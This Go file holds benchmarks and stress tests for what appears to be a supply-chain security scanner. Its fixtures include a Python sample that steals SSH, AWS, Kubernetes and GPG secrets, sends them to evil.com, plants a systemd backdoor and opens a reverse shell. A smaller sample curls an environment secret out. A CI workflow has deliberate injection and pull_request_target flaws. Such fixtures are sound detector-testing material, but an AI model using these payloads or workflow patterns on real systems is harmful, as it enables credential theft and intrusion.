package benchmarks

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/falcn-io/falcn/internal/detector"
	"github.com/falcn-io/falcn/internal/ml"
	"github.com/falcn-io/falcn/internal/proxy"
	"github.com/falcn-io/falcn/internal/reachability"
	"github.com/falcn-io/falcn/internal/scanner"
	"github.com/falcn-io/falcn/pkg/types"
)

// ═══════════════════════════════════════════════════════════════════════════════
// 1. Content Scanner Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkContentScanner_SmallProject(b *testing.B) {
	// 10 files of ~1KB each (small project)
	tmpDir := b.TempDir()
	createTestProject(tmpDir, 10)
	cs := scanner.NewContentScanner()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.ScanDirectory(tmpDir)
	}
}

func BenchmarkContentScanner_MediumProject(b *testing.B) {
	// 50 files (typical project)
	tmpDir := b.TempDir()
	createTestProject(tmpDir, 50)
	cs := scanner.NewContentScanner()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.ScanDirectory(tmpDir)
	}
}

func BenchmarkContentScanner_LargeProject(b *testing.B) {
	// 100 files (large project scan)
	tmpDir := b.TempDir()
	createTestProject(tmpDir, 100)
	cs := scanner.NewContentScanner()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.ScanDirectory(tmpDir)
	}
}

func BenchmarkContentScanner_MaliciousProject(b *testing.B) {
	// Directory with many malicious-pattern files (worst case for regex matching)
	tmpDir := b.TempDir()
	malContent := generateMaliciousContent()
	for i := 0; i < 20; i++ {
		ext := []string{".py", ".js", ".sh", ".rb"}[i%4]
		os.WriteFile(filepath.Join(tmpDir, fmt.Sprintf("evil_%d%s", i, ext)), []byte(malContent), 0644)
	}
	cs := scanner.NewContentScanner()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.ScanDirectory(tmpDir)
	}
}

func BenchmarkContentScanner_LargeFiles(b *testing.B) {
	// 10 large files (~64KB each)
	tmpDir := b.TempDir()
	content := generateNormalJS(64 * 1024)
	for i := 0; i < 10; i++ {
		os.WriteFile(filepath.Join(tmpDir, fmt.Sprintf("bundle_%d.js", i)), []byte(content), 0644)
	}
	cs := scanner.NewContentScanner()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs.ScanDirectory(tmpDir)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 2. Typosquatting Detection Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkTyposquatting_SinglePackage(b *testing.B) {
	etd := detector.NewEnhancedTyposquattingDetector()
	dep := types.Dependency{Name: "expresss", Version: "1.0.0", Registry: "npm"}
	popular := loadPopularPackages()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		etd.DetectEnhanced(dep, popular, 0.75)
	}
}

func BenchmarkTyposquatting_BatchSmall(b *testing.B) {
	// 10 packages
	benchTyposquattingBatch(b, 10)
}

func BenchmarkTyposquatting_BatchMedium(b *testing.B) {
	// 50 packages
	benchTyposquattingBatch(b, 50)
}

func BenchmarkTyposquatting_BatchLarge(b *testing.B) {
	// 200 packages (typical enterprise project)
	benchTyposquattingBatch(b, 200)
}

func benchTyposquattingBatch(b *testing.B, count int) {
	b.Helper()
	etd := detector.NewEnhancedTyposquattingDetector()
	popular := loadPopularPackages()
	deps := generateDependencies(count)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, dep := range deps {
			etd.DetectEnhanced(dep, popular, 0.75)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 3. Slopsquatting Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkSlopsquatting_SinglePackage(b *testing.B) {
	sd := detector.NewSlopsquattingDetector()
	dep := types.Dependency{Name: "flask-rest-api", Version: "1.0.0", Registry: "pypi"}
	popular := loadPopularPackages()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		sd.Detect(dep, popular)
	}
}

func BenchmarkSlopsquatting_Batch100(b *testing.B) {
	sd := detector.NewSlopsquattingDetector()
	popular := loadPopularPackages()
	deps := generateDependencies(100)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, dep := range deps {
			sd.Detect(dep, popular)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 4. ML Inference Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func newLoadedInferenceEngine(b testing.TB) *ml.InferenceEngine {
	b.Helper()
	ie := ml.NewInferenceEngine()
	if err := ie.LoadModel(""); err != nil {
		b.Fatalf("LoadModel failed: %v", err)
	}
	return ie
}

func BenchmarkMLInference_SinglePredict(b *testing.B) {
	ie := newLoadedInferenceEngine(b)
	features := make([]float32, ml.FeatureVectorSize)
	features[0] = 1000  // downloads
	features[1] = 2     // maintainers
	features[7] = 1     // has install script
	features[14] = 0.3  // binary ratio
	if ml.FeatureVectorSize > 25 {
		features[25] = 1 // credential harvesting
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ie.Predict(features)
	}
}

func BenchmarkMLInference_BatchPredict(b *testing.B) {
	ie := newLoadedInferenceEngine(b)
	batch := make([][]float32, 100)
	for j := range batch {
		batch[j] = make([]float32, ml.FeatureVectorSize)
		batch[j][0] = float32(j * 100) // vary downloads
		batch[j][1] = float32(j % 5)   // vary maintainers
	}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		ie.PredictBatch(batch)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 5. Reachability Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkReachability_SmallProject(b *testing.B) {
	tmpDir := b.TempDir()
	createGoProject(tmpDir, 5)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		a, err := reachability.New(tmpDir)
		if err != nil {
			b.Fatal(err)
		}
		a.Check("fmt")
	}
}

func BenchmarkReachability_MediumProject(b *testing.B) {
	tmpDir := b.TempDir()
	createGoProject(tmpDir, 50)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		a, err := reachability.New(tmpDir)
		if err != nil {
			b.Fatal(err)
		}
		a.Check("fmt")
	}
}

func BenchmarkReachability_BatchCheck(b *testing.B) {
	tmpDir := b.TempDir()
	createGoProject(tmpDir, 20)
	packages := []string{"fmt", "os", "net/http", "encoding/json", "strings"}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		a, err := reachability.New(tmpDir)
		if err != nil {
			b.Fatal(err)
		}
		a.CheckMultiple(packages)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 6. Proxy Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func newBenchProxy(b testing.TB) (*proxy.RegistryProxy, *httptest.Server) {
	b.Helper()
	mc := &benchMockChecker{}
	// Stand up a tiny upstream that returns a valid JSON body for any request.
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		w.Header().Set("ETag", `"bench-etag"`)
		fmt.Fprintf(w, `{"name":"upstream","path":%q,"version":"1.0.0"}`, r.URL.Path)
	}))
	b.Cleanup(upstream.Close)

	cfg := &proxy.ProxyConfig{
		ListenAddr:      ":0",
		NPMUpstream:     upstream.URL,
		PyPIUpstream:    upstream.URL,
		MavenUpstream:   upstream.URL,
		GoProxyUpstream: upstream.URL,
		CargoUpstream:   upstream.URL,
		BlockSeverity:   "high",
		WarnSeverity:    "medium",
		MaxAuditLog:     1000,
		CacheTTL:        5 * time.Minute,
	}
	p := proxy.NewRegistryProxy(cfg, mc)
	return p, upstream
}

func BenchmarkProxy_NPMMetadata(b *testing.B) {
	p, _ := newBenchProxy(b)
	handler := p.Router()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "/npm/lodash", nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}
}

func BenchmarkProxy_NPMMetadata_Cached(b *testing.B) {
	p, _ := newBenchProxy(b)
	handler := p.Router()
	// Prime cache
	req := httptest.NewRequest("GET", "/npm/lodash", nil)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "/npm/lodash", nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}
}

func BenchmarkProxy_PyPI(b *testing.B) {
	p, _ := newBenchProxy(b)
	handler := p.Router()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "/pypi/simple/requests/", nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}
}

func BenchmarkProxy_AdminStats(b *testing.B) {
	p, _ := newBenchProxy(b)
	handler := p.Router()
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("GET", "/api/v1/stats", nil)
		rec := httptest.NewRecorder()
		handler.ServeHTTP(rec, req)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 7. CI/CD Scanner Benchmarks
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkCICDScanner_SimpleWorkflow(b *testing.B) {
	tmpDir := b.TempDir()
	workflowDir := filepath.Join(tmpDir, ".github", "workflows")
	os.MkdirAll(workflowDir, 0755)
	yaml := []byte(`name: CI
on: push
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: npm test
`)
	os.WriteFile(filepath.Join(workflowDir, "ci.yml"), yaml, 0644)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs := scanner.NewCICDScanner(tmpDir)
		cs.ScanProject()
	}
}

func BenchmarkCICDScanner_ComplexWorkflow(b *testing.B) {
	tmpDir := b.TempDir()
	workflowDir := filepath.Join(tmpDir, ".github", "workflows")
	os.MkdirAll(workflowDir, 0755)
	yaml := generateComplexWorkflow()
	os.WriteFile(filepath.Join(workflowDir, "complex.yml"), yaml, 0644)
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		cs := scanner.NewCICDScanner(tmpDir)
		cs.ScanProject()
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 8. Engine Full Pipeline Benchmark
// ═══════════════════════════════════════════════════════════════════════════════

func BenchmarkEngine_FullPipeline_SinglePackage(b *testing.B) {
	engine := detector.New(nil)
	dep := types.Dependency{Name: "lodash", Version: "4.17.21", Registry: "npm"}
	popular := loadPopularPackages()
	opts := &detector.Options{SimilarityThreshold: 0.75, DeepAnalysis: true}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		engine.AnalyzeDependency(dep, popular, opts)
	}
}

func BenchmarkEngine_FullPipeline_100Packages(b *testing.B) {
	engine := detector.New(nil)
	popular := loadPopularPackages()
	deps := generateRealisticDependencies(100)
	opts := &detector.Options{SimilarityThreshold: 0.75, DeepAnalysis: true}
	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		for _, dep := range deps {
			engine.AnalyzeDependency(dep, popular, opts)
		}
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// 9. Stress Tests
// ═══════════════════════════════════════════════════════════════════════════════

func TestStress_ProxyConcurrent1000(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	p, _ := newStressProxy(t)
	handler := p.Router()

	var wg sync.WaitGroup
	var mu sync.Mutex
	var errors []error
	start := time.Now()

	for i := 0; i < 1000; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			pkgs := []string{"lodash", "express", "react", "axios", "webpack"}
			pkg := pkgs[i%len(pkgs)]

			req := httptest.NewRequest("GET", "/npm/"+pkg, nil)
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)

			if rec.Code != http.StatusOK && rec.Code != http.StatusBadGateway {
				mu.Lock()
				errors = append(errors, fmt.Errorf("request %d: unexpected status %d", i, rec.Code))
				mu.Unlock()
			}
		}(i)
	}
	wg.Wait()
	elapsed := time.Since(start)

	t.Logf("1000 concurrent proxy requests completed in %v (%.0f req/s)",
		elapsed, 1000.0/elapsed.Seconds())

	if len(errors) > 0 {
		t.Errorf("%d errors out of 1000 requests", len(errors))
		for _, err := range errors[:min(5, len(errors))] {
			t.Logf("  %v", err)
		}
	}
}

func TestStress_ContentScannerParallel(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	cs := scanner.NewContentScanner()

	// 50 goroutines scanning different temp dirs simultaneously
	var wg sync.WaitGroup
	start := time.Now()
	scans := 0

	for i := 0; i < 50; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			for j := 0; j < 20; j++ {
				tmpDir := t.TempDir()
				content := fmt.Sprintf(`
import os, subprocess, base64
data_%d_%d = os.environ.get("SECRET_%d")
encoded = base64.b64encode(data_%d_%d.encode())
subprocess.run(["curl", "-d", encoded, "https://example.com/collect"])
`, i, j, i, i, j)
				os.WriteFile(filepath.Join(tmpDir, fmt.Sprintf("test_%d_%d.py", i, j)), []byte(content), 0644)
				cs.ScanDirectory(tmpDir)
			}
		}(i)
		scans += 20
	}
	wg.Wait()
	elapsed := time.Since(start)

	t.Logf("50x20 = %d content scans completed in %v (%.0f scans/s)",
		scans, elapsed, float64(scans)/elapsed.Seconds())
}

func TestStress_TyposquattingHighVolume(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	etd := detector.NewEnhancedTyposquattingDetector()
	popular := loadPopularPackages()

	deps := make([]types.Dependency, 500)
	for i := range deps {
		deps[i] = types.Dependency{
			Name:     fmt.Sprintf("pkg-%d-test", i),
			Version:  "1.0.0",
			Registry: "npm",
		}
	}

	start := time.Now()
	for _, dep := range deps {
		etd.DetectEnhanced(dep, popular, 0.75)
	}
	elapsed := time.Since(start)

	t.Logf("500 typosquatting checks in %v (%.0f checks/s, %.2f ms/check)",
		elapsed, 500.0/elapsed.Seconds(), float64(elapsed.Milliseconds())/500.0)

	if elapsed > 30*time.Second {
		t.Errorf("500 checks took too long: %v (max 30s)", elapsed)
	}
}

func TestStress_MLInferenceThroughput(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	ie := ml.NewInferenceEngine()
	if err := ie.LoadModel(""); err != nil {
		t.Fatalf("LoadModel failed: %v", err)
	}

	start := time.Now()
	for i := 0; i < 10000; i++ {
		features := make([]float32, ml.FeatureVectorSize)
		features[0] = float32(i % 1000)
		features[1] = float32(i % 10)
		features[7] = float32(i % 2)
		ie.Predict(features)
	}
	elapsed := time.Since(start)

	t.Logf("10000 ML predictions in %v (%.0f predictions/s, %.3f ms/prediction)",
		elapsed, 10000.0/elapsed.Seconds(), float64(elapsed.Microseconds())/10000.0/1000.0)

	if elapsed > 5*time.Second {
		t.Errorf("10000 predictions too slow: %v (max 5s)", elapsed)
	}
}

func TestStress_ReachabilityLargeProject(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	tmpDir := t.TempDir()
	createGoProject(tmpDir, 100)

	start := time.Now()
	a, err := reachability.New(tmpDir)
	if err != nil {
		t.Fatal(err)
	}

	packages := []string{"fmt", "os", "net/http", "encoding/json", "strings",
		"strconv", "io", "bytes", "path/filepath", "sync"}
	results := a.CheckMultiple(packages)
	elapsed := time.Since(start)

	reachable := 0
	for _, r := range results {
		if r.Reachable {
			reachable++
		}
	}

	t.Logf("100-file project, 10 packages checked in %v", elapsed)
	t.Logf("  %d reachable, %d unreachable", reachable, len(packages)-reachable)

	if elapsed > 10*time.Second {
		t.Errorf("Reachability analysis too slow: %v (max 10s)", elapsed)
	}
}

func TestStress_ProxyAuditLogUnderLoad(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	p, _ := newStressProxy(t)
	handler := p.Router()

	// Fire 5000 requests to test audit log trimming under pressure
	var wg sync.WaitGroup
	start := time.Now()

	for i := 0; i < 5000; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			req := httptest.NewRequest("GET", fmt.Sprintf("/npm/pkg-%d", i%100), nil)
			rec := httptest.NewRecorder()
			handler.ServeHTTP(rec, req)
		}(i)
	}
	wg.Wait()
	elapsed := time.Since(start)

	t.Logf("5000 requests with audit logging in %v (%.0f req/s)",
		elapsed, 5000.0/elapsed.Seconds())

	// Verify stats endpoint still works under load
	statsReq := httptest.NewRequest("GET", "/api/v1/stats", nil)
	statsRec := httptest.NewRecorder()
	handler.ServeHTTP(statsRec, statsReq)
	t.Logf("Stats response status: %d, body length: %d", statsRec.Code, statsRec.Body.Len())

	// Verify audit log endpoint
	auditReq := httptest.NewRequest("GET", "/api/v1/audit-log", nil)
	auditRec := httptest.NewRecorder()
	handler.ServeHTTP(auditRec, auditReq)
	t.Logf("Audit log response status: %d, body length: %d", auditRec.Code, auditRec.Body.Len())
}

func TestStress_SlopsquattingHighVolume(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	sd := detector.NewSlopsquattingDetector()
	popular := loadPopularPackages()

	deps := make([]types.Dependency, 500)
	for i := range deps {
		deps[i] = types.Dependency{
			Name:     fmt.Sprintf("ai-generated-pkg-%d-utils", i),
			Version:  "0.1.0",
			Registry: "npm",
		}
	}

	start := time.Now()
	for _, dep := range deps {
		sd.Detect(dep, popular)
	}
	elapsed := time.Since(start)

	t.Logf("500 slopsquatting checks in %v (%.0f checks/s, %.2f ms/check)",
		elapsed, 500.0/elapsed.Seconds(), float64(elapsed.Milliseconds())/500.0)

	if elapsed > 15*time.Second {
		t.Errorf("500 checks took too long: %v (max 15s)", elapsed)
	}
}

func TestStress_EngineFullPipelineConcurrent(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping stress test in short mode")
	}

	engine := detector.New(nil)
	popular := loadPopularPackages()
	opts := &detector.Options{SimilarityThreshold: 0.75, DeepAnalysis: true}
	deps := generateRealisticDependencies(200)

	var wg sync.WaitGroup
	start := time.Now()

	// 10 concurrent workers analyzing packages
	for w := 0; w < 10; w++ {
		wg.Add(1)
		go func(worker int) {
			defer wg.Done()
			chunk := deps[worker*20 : (worker+1)*20]
			for _, dep := range chunk {
				engine.AnalyzeDependency(dep, popular, opts)
			}
		}(w)
	}
	wg.Wait()
	elapsed := time.Since(start)

	t.Logf("200 packages analyzed concurrently (10 workers) in %v (%.0f pkg/s)",
		elapsed, 200.0/elapsed.Seconds())

	if elapsed > 30*time.Second {
		t.Errorf("Concurrent engine analysis too slow: %v (max 30s)", elapsed)
	}
}

// ═══════════════════════════════════════════════════════════════════════════════
// Helper Functions
// ═══════════════════════════════════════════════════════════════════════════════

func generateNormalJS(size int) string {
	template := `
const express = require('express');
const app = express();

app.get('/api/data', (req, res) => {
    const data = { message: 'Hello World', timestamp: Date.now() };
    res.json(data);
});

function processData(input) {
    return input.map(x => x * 2).filter(x => x > 10);
}

module.exports = { processData };
`
	var b strings.Builder
	for b.Len() < size {
		b.WriteString(template)
	}
	s := b.String()
	if len(s) > size {
		s = s[:size]
	}
	return s
}

func generateMaliciousContent() string {
	return `
import os, base64, subprocess, socket, urllib.request, json

# Credential harvesting
paths = [os.path.expanduser("~/.ssh/id_rsa"), os.path.expanduser("~/.aws/credentials"),
         os.path.expanduser("~/.kube/config"), os.path.expanduser("~/.gnupg/secring.gpg")]
collected = {}
for p in paths:
    try:
        collected[p] = open(p).read()
    except: pass

# Exfiltration
data = base64.b64encode(json.dumps(collected).encode())
urllib.request.urlopen(urllib.request.Request("https://evil.com/collect", data=data))

# Persistence
subprocess.run(["systemctl", "--user", "enable", "backdoor.service"])
open(os.path.expanduser("~/.config/systemd/user/backdoor.service"), "w").write(
    "[Service]\nExecStart=/tmp/.hidden\nRestart=always")

# Anti-forensics
os.remove(__file__)
subprocess.run(["history", "-c"])

# Reverse shell
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("10.0.0.1", 4444))
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)
subprocess.call(["/bin/sh", "-i"])
`
}

func loadPopularPackages() []string {
	return []string{
		"react", "react-dom", "express", "lodash", "axios", "webpack",
		"moment", "chalk", "debug", "commander", "inquirer", "request",
		"async", "bluebird", "underscore", "uuid", "glob", "mkdirp",
		"minimist", "yargs", "semver", "rimraf", "through2", "pump",
		"readable-stream", "requests", "numpy", "pandas", "flask",
		"django", "tensorflow", "scipy", "matplotlib", "beautifulsoup4",
		"scikit-learn", "pillow", "sqlalchemy", "pytest", "celery", "redis",
	}
}

func generateDependencies(count int) []types.Dependency {
	prefixes := []string{"my-", "fast-", "super-", "auto-", "easy-", "simple-", "pro-"}
	suffixes := []string{"-utils", "-helper", "-lib", "-core", "-plus", "-kit", "-tool"}
	popular := loadPopularPackages()

	deps := make([]types.Dependency, count)
	for i := range deps {
		name := prefixes[i%len(prefixes)] + popular[i%len(popular)] + suffixes[i%len(suffixes)]
		deps[i] = types.Dependency{
			Name:     name,
			Version:  fmt.Sprintf("%d.0.0", i%10),
			Registry: "npm",
		}
	}
	return deps
}

func generateRealisticDependencies(count int) []types.Dependency {
	popular := loadPopularPackages()
	deps := make([]types.Dependency, count)
	for i := range deps {
		deps[i] = types.Dependency{
			Name:     popular[i%len(popular)],
			Version:  "1.0.0",
			Registry: "npm",
		}
		if i%3 == 0 {
			deps[i].Registry = "pypi"
		}
	}
	return deps
}

func createTestProject(dir string, fileCount int) {
	for i := 0; i < fileCount; i++ {
		ext := []string{".js", ".py", ".ts", ".go"}[i%4]
		content := generateNormalJS(1024 + (i * 100))
		os.WriteFile(filepath.Join(dir, fmt.Sprintf("file_%d%s", i, ext)), []byte(content), 0644)
	}
}

func createGoProject(dir string, fileCount int) {
	main := `package main

import (
	"fmt"
	"os"
	"net/http"
	"encoding/json"
	"strings"
)

func main() {
	fmt.Println("hello")
	http.ListenAndServe(":8080", nil)
}

func helper() string {
	data, _ := json.Marshal(map[string]string{"key": "value"})
	return strings.ToUpper(string(data))
}

func readConfig() {
	os.Getenv("CONFIG")
}
`
	os.WriteFile(filepath.Join(dir, "main.go"), []byte(main), 0644)

	for i := 1; i < fileCount; i++ {
		content := fmt.Sprintf(`package main

import "fmt"

func helper%d() {
	fmt.Printf("helper %%d\n", %d)
}

func process%d(data string) string {
	return fmt.Sprintf("processed: %%s", data)
}
`, i, i, i)
		os.WriteFile(filepath.Join(dir, fmt.Sprintf("file_%d.go", i)), []byte(content), 0644)
	}
}

func generateComplexWorkflow() []byte {
	return []byte(`name: Complex CI/CD
on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]
  pull_request_target:
    types: [opened, synchronize]
  issue_comment:
    types: [created]
  discussion_comment:
    types: [created]

env:
  NODE_VERSION: '18'
  GO_VERSION: '1.21'

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@main
      - uses: actions/setup-node@v3
        with:
          node-version: ${{ env.NODE_VERSION }}
      - run: npm ci
      - run: npm run lint

  test:
    needs: lint
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest, windows-latest]
        node: [16, 18, 20]
    runs-on: ${{ matrix.os }}
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v3
        with:
          node-version: ${{ matrix.node }}
      - run: npm ci
      - run: npm test
      - run: echo "Issue title is ${{ github.event.issue.title }}"

  build:
    needs: test
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v4
      - run: docker build -t myapp .
      - run: docker push myregistry/myapp:${{ github.sha }}

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - uses: actions/checkout@v4
      - run: kubectl apply -f k8s/staging/
      - run: |
          curl -X POST https://hooks.slack.com/services/xxx \
            -d '{"text": "Deployed ${{ github.sha }} to staging"}'

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    if: github.ref == 'refs/heads/main'
    steps:
      - uses: actions/checkout@v4
      - run: kubectl apply -f k8s/production/
      - run: |
          curl -X POST https://hooks.slack.com/services/xxx \
            -d '{"text": "Deployed ${{ github.sha }} to production"}'

  pr-comment:
    if: github.event_name == 'pull_request_target'
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - run: npm test
`)
}

// benchMockChecker is a minimal mock for proxy benchmarks.
type benchMockChecker struct{}

func (m *benchMockChecker) CheckPackage(_ context.Context, name, registry string) (*detector.CheckPackageResult, error) {
	return &detector.CheckPackageResult{Name: name}, nil
}

// newStressProxy creates a proxy with a mock upstream for stress tests.
func newStressProxy(t testing.TB) (*proxy.RegistryProxy, *httptest.Server) {
	t.Helper()
	mc := &benchMockChecker{}
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		fmt.Fprintf(w, `{"name":"stress-test","path":%q}`, r.URL.Path)
	}))
	t.Cleanup(upstream.Close)

	cfg := &proxy.ProxyConfig{
		ListenAddr:      ":0",
		NPMUpstream:     upstream.URL,
		PyPIUpstream:    upstream.URL,
		MavenUpstream:   upstream.URL,
		GoProxyUpstream: upstream.URL,
		CargoUpstream:   upstream.URL,
		BlockSeverity:   "high",
		WarnSeverity:    "medium",
		MaxAuditLog:     1000,
		CacheTTL:        1 * time.Second,
	}
	p := proxy.NewRegistryProxy(cfg, mc)
	return p, upstream
}
